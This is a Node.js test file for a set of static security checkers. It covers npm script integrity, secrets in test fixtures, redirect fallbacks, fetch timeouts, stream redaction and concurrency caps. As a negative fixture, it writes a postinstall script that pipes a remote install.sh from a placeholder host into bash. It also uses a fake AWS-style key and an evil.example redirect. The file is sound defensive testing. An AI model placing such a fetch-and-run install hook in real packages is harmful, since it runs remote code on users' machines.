import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { analyzeCircuitBreakerPolicy } from "./check-circuit-breaker-policy.mjs";
import { analyzeConcurrencyCapGuards } from "./check-concurrency-cap-guards.mjs";
import { analyzeNpmScriptIntegrity } from "./check-npm-script-integrity.mjs";
import { analyzeSecurityFallbackPaths } from "./check-security-fallback-paths.mjs";
import { analyzeStaticCheckDeterminism } from "./check-static-check-determinism.mjs";
import { analyzeStreamPayloadSensitivity } from "./check-stream-payload-sensitivity.mjs";
import { analyzeTestFixtureSecrets } from "./check-test-fixture-secrets.mjs";

function tempRoot(name) {
  return fs.mkdtempSync(path.join(os.tmpdir(), `oblixa-${name}-`));
}

function write(root, rel, content) {
  const abs = path.join(root, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, content);
}

function writeJson(root, rel, value) {
  write(root, rel, `${JSON.stringify(value, null, 2)}\n`);
}

function writeGenericReporter(root) {
  write(root, "scripts/security-check-generic.mjs", "export function runGenericSecurityCheck() {}\n");
}

function writeSafeRedirectHelper(root) {
  write(
    root,
    "src/lib/security/redirect.ts",
    'export function getSafeRedirectPath(raw: string | null) {\nconst fallback = "/dashboard";\nif (!raw) return fallback;\nif (!raw.startsWith("/") || raw.startsWith("//") || raw.includes("://")) return fallback;\nif (/[\\x00-\\x1f\\x7f\\\\]/.test(raw)) return fallback;\nreturn raw;\n}\n'
  );
}

function writeCircuitHelpers(root) {
  write(
    root,
    "src/lib/security/safe-fetch.ts",
    'const SAFE_FETCH_DEFAULT_TIMEOUT_MS = 15_000;\nexport async function safeFetch(input: string, init: { timeoutMs?: number; redirect?: string } = {}) {\nconst { timeoutMs: explicitTimeout, ...rest } = init;\nconst timeoutMs = explicitTimeout ?? SAFE_FETCH_DEFAULT_TIMEOUT_MS;\nif (rest.redirect && rest.redirect !== "manual") throw new Error("manual only");\nconst controller = new AbortController();\nconst timer = setTimeout(() => controller.abort(), timeoutMs);\ntry { return await fetch(input, { ...rest, redirect: "manual", signal: controller.signal }); } finally { clearTimeout(timer); }\n}\n'
  );
  write(
    root,
    "src/lib/extraction/retry.ts",
    'function sleep(ms: number) { return new Promise((r) => setTimeout(r, ms)); }\nexport async function fetchWithRetry(input: RequestInfo | URL, init?: RequestInit, options?: { maxAttempts?: number; maxDelayMs?: number }) {\nconst maxAttempts = options?.maxAttempts ?? 4;\nconst maxDelayMs = options?.maxDelayMs ?? 8000;\nlet last: Response | undefined;\nfor (let attempt = 1; attempt <= maxAttempts; attempt++) {\nlast = await fetch(input, init);\nif (last.ok) return last;\nconst retryable = last.status === 429 || last.status === 502 || last.status === 503 || last.status === 504;\nif (!retryable || attempt === maxAttempts) return last;\nawait sleep(Math.min(maxDelayMs, 100));\n}\nreturn last!;\n}\n'
  );
}

test("analyzeNpmScriptIntegrity accepts existing node script refs and the pinned SBOM command", () => {
  const root = tempRoot("npm-script-ok");
  writeGenericReporter(root);
  write(root, "scripts/check-demo.mjs", "console.log('ok');\n");
  writeJson(root, "package.json", {
    scripts: {
      "check:demo": "node scripts/check-demo.mjs",
      sbom: "npx --yes @cyclonedx/cyclonedx-npm@4.2.1 --output-file cyclonedx-sbom.json --package-lock-only --ignore-npm-errors",
    },
  });

  const report = analyzeNpmScriptIntegrity(root);
  assert.equal(report.ok, true);
});

test("analyzeNpmScriptIntegrity rejects missing script files and remote shell bootstraps", () => {
  const root = tempRoot("npm-script-bad");
  writeGenericReporter(root);
  writeJson(root, "package.json", {
    scripts: {
      "check:missing": "node scripts/check-missing.mjs",
      postinstall: "curl https://example.test/install.sh | bash",
    },
  });

  const report = analyzeNpmScriptIntegrity(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "missing_node_script_file" && issue.file === "package.json"));
  assert(report.issues.some((issue) => issue.issue === "remote_shell_download" && issue.file === "package.json"));
});

test("analyzeTestFixtureSecrets accepts placeholders and rejects high-confidence live material", () => {
  const okRoot = tempRoot("fixture-secret-ok");
  write(okRoot, "src/lib/demo.test.ts", 'const key = "sk_test_1234567890abcdef";\n');
  assert.equal(analyzeTestFixtureSecrets(okRoot).ok, true);

  const badRoot = tempRoot("fixture-secret-bad");
  const awsKey = "AKIA1234567890" + "ABCDEF";
  write(badRoot, "src/lib/demo.test.ts", `const key = "${awsKey}";\n`);
  const report = analyzeTestFixtureSecrets(badRoot);
  assert.equal(report.ok, false);
  assert.deepEqual(report.issues[0], {
    issue: "aws_access_key_in_test_fixture",
    file: "src/lib/demo.test.ts",
    line: 1,
    evidence: "AKIA1234[redacted]CDEF",
  });
});

test("analyzeSecurityFallbackPaths accepts internal fallbacks and rejects external destinations", () => {
  const okRoot = tempRoot("fallback-ok");
  writeSafeRedirectHelper(okRoot);
  write(okRoot, "src/lib/routes.ts", 'export const row = { fallbackHref: "/work" };\n');
  assert.equal(analyzeSecurityFallbackPaths(okRoot).ok, true);

  const badRoot = tempRoot("fallback-bad");
  writeSafeRedirectHelper(badRoot);
  write(badRoot, "src/lib/routes.ts", 'export const row = { fallbackHref: "https://evil.example/path" };\n');
  const report = analyzeSecurityFallbackPaths(badRoot);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "unsafe_fallback_destination_literal" && issue.file === "src/lib/routes.ts"));
});

test("analyzeCircuitBreakerPolicy accepts bounded helpers and rejects missing timeout defaults", () => {
  const okRoot = tempRoot("circuit-ok");
  writeCircuitHelpers(okRoot);
  assert.equal(analyzeCircuitBreakerPolicy(okRoot).ok, true);

  const badRoot = tempRoot("circuit-bad");
  write(badRoot, "src/lib/security/safe-fetch.ts", "export async function safeFetch(input: string) { return fetch(input); }\n");
  write(badRoot, "src/lib/extraction/retry.ts", "export async function fetchWithRetry(input: RequestInfo) { return fetch(input); }\n");
  const report = analyzeCircuitBreakerPolicy(badRoot);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "safe_fetch_missing_timeout_option" && issue.file === "src/lib/security/safe-fetch.ts"));
});

test("analyzeStreamPayloadSensitivity accepts redacted streams and rejects sensitive enqueue payloads", () => {
  const okRoot = tempRoot("stream-ok");
  write(okRoot, "src/lib/stream.ts", 'function redact(v: string) { return v; }\nnew ReadableStream({ start(controller) { controller.enqueue(redact("token")); } });\n');
  assert.equal(analyzeStreamPayloadSensitivity(okRoot).ok, true);

  const badRoot = tempRoot("stream-bad");
  write(badRoot, "src/lib/stream.ts", 'new ReadableStream({ start(controller) { controller.enqueue({ token: "secret" }); } });\n');
  const report = analyzeStreamPayloadSensitivity(badRoot);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "stream_enqueue_missing_redaction_guard" && issue.file === "src/lib/stream.ts"));
});

test("analyzeConcurrencyCapGuards accepts explicit caps and rejects unbounded Promise.all maps", () => {
  const okRoot = tempRoot("concurrency-ok");
  write(
    okRoot,
    "src/actions/upload.ts",
    'const MAX_FILES = 4;\nexport async function run(files: File[]) {\nif (files.length > MAX_FILES) throw new Error("too many");\nreturn Promise.all(files.map(async (file) => file.name));\n}\n'
  );
  assert.equal(analyzeConcurrencyCapGuards(okRoot).ok, true);

  const badRoot = tempRoot("concurrency-bad");
  write(badRoot, "src/actions/upload.ts", 'export async function run(files: File[]) {\nreturn Promise.all(files.map(async (file) => file.name));\n}\n');
  const report = analyzeConcurrencyCapGuards(badRoot);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "promise_all_map_without_concurrency_cap" && issue.file === "src/actions/upload.ts"));
});

test("analyzeStaticCheckDeterminism separates reports and rejects generic blocking checks", () => {
  const okRoot = tempRoot("static-determinism-ok");
  writeJson(okRoot, "package.json", { scripts: { "check:good": "node scripts/check-good.mjs", "report:info": "node scripts/report-info.mjs" } });
  write(okRoot, "scripts/check-good.mjs", 'console.log(JSON.stringify({ checkId: "good", issueCount: 0, issues: [] }));\n');
  write(okRoot, "scripts/report-info.mjs", "console.log('info');\n");
  assert.equal(
    analyzeStaticCheckDeterminism(okRoot, {
      requiredScripts: ["check:good"],
      securitySteps: ["check:good", { script: "report:info", required: false }],
    }).ok,
    true
  );

  const badRoot = tempRoot("static-determinism-bad");
  writeJson(badRoot, "package.json", { scripts: { "check:bad": "node scripts/check-bad.mjs", "report:info": "node scripts/report-info.mjs" } });
  write(badRoot, "scripts/check-bad.mjs", 'import { runGenericSecurityCheck } from "./security-check-generic.mjs";\nrunGenericSecurityCheck(import.meta.url);\n');
  write(badRoot, "scripts/report-info.mjs", "console.log('info');\n");
  const report = analyzeStaticCheckDeterminism(badRoot, {
    requiredScripts: ["check:bad"],
    securitySteps: ["check:bad", "report:info"],
  });
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "generic_signal_check_in_blocking_security_step" && issue.file === "scripts/check-bad.mjs"));
  assert(report.issues.some((issue) => issue.issue === "informational_report_is_blocking" && issue.script === "report:info"));
});
